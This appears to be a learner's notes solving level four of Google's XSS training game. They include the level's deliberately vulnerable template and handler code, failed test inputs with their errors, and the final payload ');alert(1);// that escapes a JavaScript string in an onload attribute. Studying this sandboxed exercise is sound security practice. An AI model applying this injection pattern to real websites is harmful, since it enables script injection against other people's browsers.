Google XSS security game

# level four

## objective 

Inject a script to pop up a javascript alert() in the application

## mission description

 every bit of the user-supplied data must be correctly escaped for the ontext of the page in which it will appear\

## observations

url: https://xss-game.appspot.com/level4/frame

title at the top of the page: timemer with the "i" as a different color.

use rinput field with a a button labeled "Create timer"

user input already has a "3" in the field

### index.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
  </head>
 
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <form action="" method="GET">
      <input id="timer" name="timer" value="3">
      <input id="button" type="submit" value="Create timer"> </form>
    </form>
  </body>
</html>
```

### level.py

```py
class MainPage(webapp.RequestHandler):
 
  def render_template(self, filename, context={}):
    path = os.path.join(os.path.dirname(__file__), filename)
    self.response.out.write(template.render(path, context))
 
  def get(self):
    # Disable the reflected XSS filter for demonstration purposes
    self.response.headers.add_header("X-XSS-Protection", "0")
 
    if not self.request.get('timer'):
      # Show main timer page
      self.render_template('index.html')
    else:
      # Show the results page
      timer= self.request.get('timer', 0)
      self.render_template('timer.html', { 'timer' : timer })
     
    return
 
application = webapp.WSGIApplication([ ('.*', MainPage), ], debug=False)
```

### timer.html

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />
 
    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
    <br>
    <div id="message">Your timer will execute in {{ timer }} seconds.</div>
  </body>
</html>
```

pressing the "Create timer" starts the clock and then sends a message when the timer is up. THe user clicks either "okay" or "Cancel"

network/doc/payload "timer=100"

### Response to random non-integer input

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />

    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('windows.history.back();');" />
    <br>
    <div id="message">Your timer will execute in windows.history.back(); seconds.</div>
  </body>
</html>
```
### Second test using signle quotation mark '

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />

    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('&#39;');" />
    <br>
    <div id="message">Your timer will execute in &#39; seconds.</div>
  </body>
</html>
```
The timer is still going after several minutes and I don't think the timer will stop.

### Errors encountered

```javascript
frame?timer=%27:21 Uncaught SyntaxError: missing ) after argument list (at frame?timer=%27:21:79)
frame?timer=%27:21 Uncaught SyntaxError: missing ) after argument list (at frame?timer=%27:21:79)

frame?timer=%22startTimer%28%27%27%27%29%3B%22:21 Uncaught SyntaxError: missing ) after argument list (at frame?timer=%22startTimer%28%27%27%27%29%3B%22:21:114)
```

Something I missed was that it was requiring me to close the ardument list. So the next thing to try is to place a closing parentheses before entering any javascript.

So the alert should look like this:

```javascript
');alert(1);//
```

then the result from the function startTimer() should be

```html
    <img src="/static/loading.gif" onload="startTimer('');alert(1);//');" />
```

### Results

```html
<!doctype html>
<html>
  <head>
    <!-- Internal game scripts/styles, mostly boring stuff -->
    <script src="/static/game-frame.js"></script>
    <link rel="stylesheet" href="/static/game-frame-styles.css" />

    <script>
      function startTimer(seconds) {
        seconds = parseInt(seconds) || 3;
        setTimeout(function() { 
          window.confirm("Time is up!");
          window.history.back();
        }, seconds * 1000);
      }
    </script>
  </head>
  <body id="level4">
    <img src="/static/logos/level4.png" />
    <br>
    <img src="/static/loading.gif" onload="startTimer('&#39;);alert(1);//');" />
    <br>
    <div id="message">Your timer will execute in &#39;);alert(1);// seconds.</div>
  </body>
</html>
```